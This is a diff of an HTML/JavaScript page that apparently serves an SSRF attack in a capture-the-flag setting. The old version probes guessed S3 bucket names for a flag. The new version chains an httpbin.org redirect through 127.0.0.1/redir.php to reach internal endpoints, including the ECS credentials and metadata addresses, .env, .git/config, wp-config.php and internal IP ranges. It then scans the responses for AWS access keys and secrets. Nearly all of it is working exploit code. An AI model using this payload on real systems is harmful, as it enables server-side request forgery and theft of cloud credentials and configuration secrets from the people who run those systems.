@@ -1,86 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Direct S3 Bucket Access</title>
+    <title>Internal AWS Service Enumeration</title>
 </head>
 <body>
-    <h1>🪣 Direct S3 Bucket Access Test</h1>
+    <h1>🔍 Internal AWS Service & Credential Enumeration</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Try to access S3 buckets directly (some might be public)
-        results += "<h2>🎯 Direct S3 Bucket Enumeration</h2>";
-        results += "<p>Based on original writeup: S3 bucket 'secretdocs' with 'leviathan.txt'</p>";
+        // Look for alternative AWS services and credential sources using our working SSRF
+        results += "<h2>🎯 Internal AWS Service Discovery</h2>";
+        results += "<p>Using working chain: httpbin.org redirect → 127.0.0.1/redir.php → targets</p>";
         
-        var s3Tests = [
-            // Original writeup S3 bucket
-            { url: 'https://secretdocs.s3.amazonaws.com/', desc: 'secretdocs bucket (original writeup)' },
-            { url: 'https://secretdocs.s3.amazonaws.com/leviathan.txt', desc: 'leviathan.txt (original flag file)' },
-            { url: 'http://secretdocs.s3.amazonaws.com/', desc: 'secretdocs HTTP' },
-            { url: 'http://secretdocs.s3.amazonaws.com/leviathan.txt', desc: 'leviathan.txt HTTP' },
+        var internalTests = [
+            // AWS-related internal services that might have credentials
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost:8080/health', desc: 'Health endpoint (might leak AWS info)' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost:9000/status', desc: 'Status endpoint' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost:3000/api/config', desc: 'API config endpoint' },
             
-            // Common S3 bucket names for CTFs
-            { url: 'https://flag.s3.amazonaws.com/', desc: 'flag bucket' },
-            { url: 'https://flags.s3.amazonaws.com/', desc: 'flags bucket' },
-            { url: 'https://ctf.s3.amazonaws.com/', desc: 'ctf bucket' },
-            { url: 'https://challenge.s3.amazonaws.com/', desc: 'challenge bucket' },
-            { url: 'https://tenable.s3.amazonaws.com/', desc: 'tenable bucket' },
-            { url: 'https://tenablecs.s3.amazonaws.com/', desc: 'tenablecs bucket' },
-            { url: 'https://tenablecstools.s3.amazonaws.com/', desc: 'tenablecstools bucket' },
-            { url: 'https://hacking-tools.s3.amazonaws.com/', desc: 'hacking-tools bucket' },
-            { url: 'https://hackingtools.s3.amazonaws.com/', desc: 'hackingtools bucket' },
+            // Application configuration endpoints
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/api/config', desc: 'App API config' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/config', desc: 'App config' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/env', desc: 'Environment variables' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/debug', desc: 'Debug endpoint' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/status', desc: 'App status' },
             
-            // Try different file names
-            { url: 'https://secretdocs.s3.amazonaws.com/flag.txt', desc: 'flag.txt in secretdocs' },
-            { url: 'https://secretdocs.s3.amazonaws.com/flag', desc: 'flag in secretdocs' },
-            { url: 'https://secretdocs.s3.amazonaws.com/secret.txt', desc: 'secret.txt in secretdocs' },
+            // Look for S3 bucket information in app
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/s3', desc: 'S3 endpoint' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/bucket', desc: 'Bucket info' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/aws', desc: 'AWS endpoint' },
             
-            // Different regions
-            { url: 'https://secretdocs.s3.us-east-1.amazonaws.com/', desc: 'secretdocs us-east-1' },
-            { url: 'https://secretdocs.s3.us-east-1.amazonaws.com/leviathan.txt', desc: 'leviathan.txt us-east-1' },
-            { url: 'https://secretdocs.s3-us-east-1.amazonaws.com/', desc: 'secretdocs s3-us-east-1' },
-            { url: 'https://secretdocs.s3-us-east-1.amazonaws.com/leviathan.txt', desc: 'leviathan.txt s3-us-east-1' },
+            // Try to find configuration files via web server
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/app.json', desc: 'App config JSON' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/config.json', desc: 'Config JSON' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/settings.json', desc: 'Settings JSON' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/package.json', desc: 'Package JSON' },
+            
+            // Check if there are other internal IPs with services
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://172.31.0.1/', desc: 'Internal network 172.31.x.x' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://10.0.0.1/', desc: 'Internal network 10.x.x.x' },
+            
+            // Container/Docker specific endpoints
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.170.2/v2/metadata', desc: 'ECS metadata endpoint' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.170.2/v2/credentials', desc: 'ECS credentials endpoint' },
+            
+            // Try accessing the application source/directory directly
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/.git/config', desc: 'Git config' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/.env', desc: 'Environment file' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/Dockerfile', desc: 'Dockerfile' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/docker-compose.yml', desc: 'Docker compose' },
+            
+            // Check for backup/old files that might contain credentials
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/backup.php', desc: 'Backup file' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/old.php', desc: 'Old file' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/config.bak', desc: 'Config backup' },
+            
+            // Try common web application paths
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/admin/', desc: 'Admin panel' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/admin/config.php', desc: 'Admin config' },
+            { url: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/wp-config.php', desc: 'WordPress config' },
         ];
         
-        for(var i = 0; i < s3Tests.length; i++) {
+        for(var i = 0; i < internalTests.length; i++) {
             try {
-                var test = s3Tests[i];
-                results += "<h3>🪣 " + (i+1) + ": " + test.desc + "</h3>";
-                results += "<div style='font-size:11px;color:#666;margin-bottom:5px;'>" + test.url + "</div>";
+                var test = internalTests[i];
+                results += "<h3>🔍 " + (i+1) + ": " + test.desc + "</h3>";
                 
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', test.url, false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(test.url), false);
                 xhr.send();
                 
-                if(xhr.responseText && xhr.responseText.trim().length > 0) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ ACCESSIBLE: " + xhr.responseText.length + " bytes</div>";
+                if(xhr.responseText && xhr.responseText.trim().length > 10) {
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ FOUND: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Check for flag content
+                    // Check for AWS-related content
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('flag{') || text.includes('ctf{') || text.includes('}')) {
-                        results += "<div style='background:#ff0000;color:white;padding:20px;border:5px solid red;text-align:center;font-size:18px;'>🎉🎉🎉 FLAG FOUND! 🎉🎉🎉</div>";
+                    if(text.includes('aws_access_key') || text.includes('aws_secret') || text.includes('accesskeyid')) {
+                        results += "<div style='background:#ff0000;color:white;padding:20px;border:5px solid red;text-align:center;font-size:18px;'>🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨</div>";
                     }
-                    if(text.includes('leviathan') || text.includes('secret') || text.includes('no sound, once made')) {
-                        results += "<div style='background:#32cd32;color:white;padding:15px;border:3px solid green;'>🎯 ORIGINAL WRITEUP CONTENT DETECTED!</div>";
+                    if(text.includes('secretdocs') || text.includes('leviathan') || text.includes('s3://')) {
+                        results += "<div style='background:#32cd32;color:white;padding:15px;border:3px solid green;'>🎯 S3 BUCKET REFERENCE FOUND!</div>";
                     }
-                    if(text.includes('<listbucketresult') || text.includes('<contents>')) {
-                        results += "<div style='background:#74c0fc;padding:10px;'>📂 S3 BUCKET LISTING!</div>";
+                    if(text.includes('bucket') || text.includes('s3') || text.includes('aws')) {
+                        results += "<div style='background:#74c0fc;padding:10px;'>☁️ AWS/S3 KEYWORDS DETECTED!</div>";
                     }
-                    if(text.includes('access denied') || text.includes('403')) {
-                        results += "<div style='background:#ffcccb;padding:8px;'>🚫 Access Denied</div>";
+                    if(text.includes('asia') && text.includes('secret')) {
+                        results += "<div style='background:#ffa500;color:white;padding:10px;'>🔑 POTENTIAL AWS KEY PATTERN!</div>";
                     }
-                    if(text.includes('no such bucket') || text.includes('404')) {
-                        results += "<div style='background:#ffeaa7;padding:8px;'>❌ Bucket Not Found</div>";
+                    if(text.includes('config') || text.includes('env') || text.includes('settings')) {
+                        results += "<div style='background:#9370db;color:white;padding:8px;'>⚙️ CONFIGURATION DATA!</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText.substring(0, 800) + "</div>";
                 } else {
-                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
+                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No useful response</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 60) + "</div>";
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 50) + "</div>";
             }
         }
         
